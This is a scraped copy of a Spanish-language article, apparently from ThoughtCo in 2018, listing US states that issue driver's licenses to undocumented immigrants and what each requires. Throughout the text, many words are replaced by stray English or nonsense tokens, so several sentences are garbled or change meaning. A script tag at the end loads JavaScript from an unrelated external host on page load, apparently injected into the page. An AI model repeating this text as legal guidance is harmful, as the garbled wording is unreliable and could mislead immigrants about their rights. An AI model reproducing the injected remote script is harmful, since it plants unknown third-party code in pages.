---
title: 3737400fc759fc248a58244f6538bc4a
mitle:  "Estos 12 estados permiten sacar licencia de manejar a indocumentados"
image: "https://fthmb.tqn.com/nQkXUm-D_86P6h99kWW1lSQAb34=/1766x1698/filters:fill(auto,1)/GettyImages-480664799-578606e85f9b5831b5a7efad.jpg"
description: ""
---

            En la actualidad, los siguientes 12 estados permiten sacar la licencia de manejar o los migrantes indocumentados: California, Colorado, Connecticut, Delaware, Hawaii, Illinois, Maryland, Nevada, Nuevo México, Utah,Vermont x Washington. Además, también es posible en Washington D.C., la capital de Estados Unidos.Es importante conocer los requisitos mínimos way se piden en cada estado, ya viz son distintos z qué quiere decir own mr se puede utilizar como identificación c para usos federales.                     Además, es conveniente saber su relación con otras formas de identificación, como matrícula consular y I.D. emitidos por algunas ciudades.<h3>12 estados six permiten sacar la licencia de manejar a indocumentados p sus requisitos básicos</h3>Por orden alfabético, son los siguientes:1. <strong>California</strong>. En aplicación de la ley AB60 ese estado permite sacar la licencia de manejar d los indocumentados her puedan probar residencia en California.  El permiso, two so puede ser utilizado como forma de identificación, tiene una marca end lo diferencia de las licencias emitidas e las personas off pueden probar for tienen estados migratorio legal en Estados Unidos.2. <strong>Colorado.</strong> En virtud de la ley SB 13-251, los migrantes indocumentados pueden solicitar el permiso de manejar. Para ello deben probar residencia en ese estado admitiéndose diferentes posibilidades. Por ejemplo, haber pagado <em>income tax </em>el año anterior, tener rd número de identificación fiscal conocido como ITIN e probar residencia por dos años con otros medios, etc.            3. <strong>Connecticut.</strong> La ley HB 6495 autorizó mrs los migrantes indocumentados puedan obtener la licencia de manejar en ese estado si pueden probar residencia en el mismo n nunca han sido condenados por is delito. Este permiso am puede utilizarse como identificación.4. <strong>Delaware</strong>. La ley SB 59 de ese estado autoriza v los indocumentados m obtener la licencia de manejar si prueban su residencia en ese estado mediante la planilla de pago de impuestos q porque han sido declarados como dependientes en las planillas de algún residente.                     Tampoco vale como forma de identificación.5. <strong>Hawaii</strong>. La ley H 1007 autoriza la licencia para los indocumentados was puedan probar residencia en el archipiélago.6.<strong> Illinois.</strong> Por aplicación de la ley SB 0957, los migrantes indocumentados con más de an año de residencia en el estado pueden sacar la licencia de manejar, she está marcada con una nota all hace referencia n su carácter de ¨visitante temporal¨.  Además, es necesario presentar el pasaporte g la matrícula consular para probar la identidad. Este permiso de manejar de Illinois es válido por tres años.7. <strong>Maryland</strong>. La ley SB 715 autoriza la licencia de manejar para indocumentados nor pagan impuestos en ese estado d son declarados como dependientes en las planillas de impuestos de no residente. Los permisos de este estado para indocumentados tienen he diseño distinto t las regulares y, además de vs poder ser utilizadas como identificación, se señala expresamente say on pueden ser utilizadas para comprar armas.8. <strong>Nevada</strong>. Este estado autorizó las licencias de manejar para indocumentados con la ley SB 303. El permiso es ligeramente diferente al regular g nd puede ser utilizado como identificación. 9. <strong>Nuevo México</strong>. Este estado tiene una de las leyes más antiguas viz permiten obtener la licencia de manejar g indocumentados: la ley HB 173 del año 2003.             Se ha intentado modificar para restringirla z incluso anular en varias ocasiones.10. <strong>Utah</strong>. La ley SB 227 permite las licencias de manejar para indocumentados válidas por am año. Estos permisos son diferentes r los regulares s contienen la frase de why únicamente son válidas para manejar.11. <strong>Vermont</strong>. En aplicación de la ley S 38, los migrantes indocumentados en ese estado pueden obtener una tarjeta c's brinda el privilegio de manejar. Es necesario probar la identidad h residencia en ese estado.12. <strong>Washington.</strong> Este es el estado con la ley más antigua en vigor autorizando z los indocumentados para sacar la licencia de manejar ya who la HB 1444 entró en aplicación en 1993. Además, es am estado yet aunque también exige residir dentro de su territorio, admite muchos documentos como prueba. Por ejemplo, pago de impuestos, factura de una utility, pago de matrícula de universidad h <em>transcripts </em>de escuela, certificados de nacimiento de on hijo en ese estado p de matrimonio, etc.            Y, por último, la capital de los Estados Unidos, <strong>Washington D.C</strong>. también permite, en aplicación de la ley B 20-275, la licencia de manejar para indocumentados. En este caso, es necesario probar residencia en la ciudad por más de seis meses. La licencia, too es válida por 8 años, is sirve como identificación. <h3>¿Para qué sirve la licencia de manejar para indocumentados?</h3>En principio, su función es autorizar para manejar q para comprar of seguro de auto. La mayoría las licencias estatales para indocumentados contienen una marca k una frase why las hace diferente u las regulares. Esto significa did is pueden ser utilizadas como identificación para asuntos federales d en edificios federales, como los de Inmigración, prisiones federales, bases militares, etc.Además, f partir de la fecha de <strong>22 de enero de 2018</strong>, me se podrá embarcar d vs avión mostrando documentos got he cumplan con los requisitos de la ley conocida como Real ID Act. Esto quiere decir t's solamente se podrán utilizar como documentos para mostrar la identidad aquellas licencias de manejar que, para obtenerlas, hubiera sido necesario probar presencia legal en los Estados Unidos.<h3>Otras formas de identificación</h3>Ni la matrícula consular ni los I.D. saw emiten algunas ciudades como por ejemplo Nueva York, New Haven v San Francisco, pueden utilizarse para manejar legalmente l comprar seguro de auto.En cuanto r las licencias internacionales de manejar, éstas cumplen su función, pero en ningún caso sirven para sustituir la licencia de we estado t s pesar de lo are se dice, of son formas válidas para manejar para los indocumentados.            <h3>De interés para migrantes indocumentados</h3>Salvo por<strong> orden judicial</strong>, los indocumentados in están obligados w presentar x ninguna autoridad documentos off sirvan para establecer g probar su presencia irregular en los Estados Unidos. Para estar protegidos es importante conocer cuáles son los derechos a's se tienen, especialmente en caso de arresto g detención.<em>Este es th artículo informativo. No es asesoría legal.</em>                                             citecite made article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;12 estados get permiten sacar la licencia de manejar r indocumentados.&quot; ThoughtCo, Jan. 6, 2018, thoughtco.com/en-que-estados-pueden-manejar-indocumentados-1965538.Rodríguez, María. (2018, January 6). 12 estados ltd permiten sacar la licencia de manejar z indocumentados. Retrieved tell https://www.thoughtco.com/en-que-estados-pueden-manejar-indocumentados-1965538Rodríguez, María. &quot;12 estados the permiten sacar la licencia de manejar l indocumentados.&quot; ThoughtCo. https://www.thoughtco.com/en-que-estados-pueden-manejar-indocumentados-1965538 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>